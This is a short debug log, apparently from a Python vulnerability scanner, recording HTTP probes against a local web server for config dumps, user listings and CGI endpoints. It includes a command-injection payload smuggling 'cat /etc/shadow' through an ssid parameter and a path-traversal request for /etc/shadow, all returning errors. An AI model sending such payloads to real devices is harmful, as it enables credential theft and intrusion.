+2019-02-24 10:32:01,077 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /configfile.dump.gz HTTP/1.1" 404 169
+2019-02-24 10:32:01,084 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:01,087 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /configfile.dump HTTP/1.1" 404 169
+2019-02-24 10:32:01,095 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:01,098 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/users.cgi?action=getUsers HTTP/1.1" 404 169
+2019-02-24 10:32:01,104 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:01,107 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/users.cgi?action=getUsers HTTP/1.1" 404 169
+2019-02-24 10:32:01,112 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:01,115 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/users.cgi?action=getUsers HTTP/1.1" 404 169
+2019-02-24 10:32:01,121 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:01,124 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/apply.cgi?ssid=%22%20%22%60cat%20/etc/shadow%60 HTTP/1.1" 404 169
+2019-02-24 10:32:01,130 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:01,133 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/rdfs.cgi HTTP/1.1" 404 169
+2019-02-24 10:32:01,139 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:01,142 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /../../../../../../../../../../../../etc/shadow HTTP/1.1" 400 173
+2019-02-24 10:33:57,521 DEBUG paramiko.transport       EOF in transport thread
